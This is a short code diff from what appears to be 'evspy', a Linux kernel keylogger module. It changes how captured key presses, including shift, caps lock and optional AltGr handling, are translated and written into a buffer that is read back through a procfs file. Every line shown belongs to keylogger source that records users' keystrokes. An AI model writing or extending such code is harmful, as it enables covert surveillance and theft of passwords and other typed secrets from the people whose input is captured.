@@ -28,7 +28,10 @@ static char *rdp;			// read pointer
 static char *wrp;			// write pointer
 static unsigned short int capslock_on = 0;
 static unsigned short int shift_on = 0;
+
+#ifdef EVS_ALTGR_ENABLED
 static unsigned short int altgr_on = 0;
+#endif
 
 /*
  * Executed when the procfs file is read (EVS_PROCNAME)
@@ -193,9 +196,12 @@ static void evspy_event(struct input_handle *handle, unsigned int type,
 
 	// "Immediate" keys (alphanumeric + some symbols)
 	} else if (value == EVS_VAL_PRESS) {
+#ifdef EVS_ALTGR_ENABLED
 		if (altgr_on)
 			evs_insert(evs_altgr(code));
-		else if (shift_on || capslock_on)
+		else
+#endif
+		if (shift_on || capslock_on)
 			evs_insert(evs_shift(code));
 		else
 			evs_insert(map[code]);
